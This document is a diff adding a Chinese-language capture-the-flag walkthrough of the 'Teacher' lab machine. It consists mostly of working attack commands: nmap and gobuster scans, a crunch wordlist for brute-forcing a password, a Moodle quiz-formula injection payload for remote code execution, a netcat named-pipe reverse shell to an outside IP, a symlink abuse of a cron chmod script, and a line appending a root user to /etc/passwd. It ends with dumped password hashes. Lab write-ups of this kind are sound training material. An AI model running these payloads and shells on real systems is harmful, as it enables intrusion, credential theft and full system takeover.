@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn 10.129.29.184 > nmap.txt
+nmap -p- 10.129.29.184 > nmapall.txt
+gobuster dir  -u http://blackhatuni.com/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobuster.txt
+gobuster dir  -u http://teacher.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobusterteacher.txt
+
+
+
+1.nmap掃描發現80端口,訪問發現blackhatuni.com域名
+2.gobuster發現images下5.png異常,使用curl返回 Th4C00lTheacha
+ curl http://teacher.htb/images/5.png
+3.生成密碼後用burp破解出密碼是 Th4C00lTheacha#
+crunch 15 15 -t Th4C00lTheacha^ > password
+4.新建一個quiz在formula的地方輸入指定參數 (參考https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips)
+/*{a*/`$_GET[0]`;//{x}}
+/*{a*/`$_REQUEST[cmd]`;//{x}}
+$_REQUEST["cmd"]
+5.訪問原頁面後面加上&cmd=ping -c 10.10.14.45 取得remote code execution
+http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&cmd=ping -c 1 10.10.14.45
+6.以下 urlencode執行後取得reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 4444 >/tmp/f
+7.上傳pspy64發現有定時任務/usr/bin/backup.sh
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+8.重點最後腳本會cd到tmp下,將所有東西更改權限777
+9.只要在tmp下 創建檔案passwd軟連到/etc/passwd,執行時就會將/etc/passwd改成777
+10.添加kali用戶用取得root權限
+echo 'kali:$6$irbaKgZA08Nkvl/Z$IjChNZzrw1gt8D25jMGq7RoGV5uUxaVpc1ZxWGkGaqPZEi29iEb5iOLWg.dLQM.MkZUh9k9kFPlSjd6edBTTU1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+--------------------------------------------------------------+------------+----------+
+ password                                                     | firstname  | lastname |
+--------------------------------------------------------------+------------+----------+
+ $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO | Guest user |          |
+ $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 | Admin      | User     |
+ $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO | Giovanni   | Chhatta  |
+ 7a860966115182402ed06375cf0a22af                             |            |          |expelled
+--------------------------------------------------------------+------------+----------+
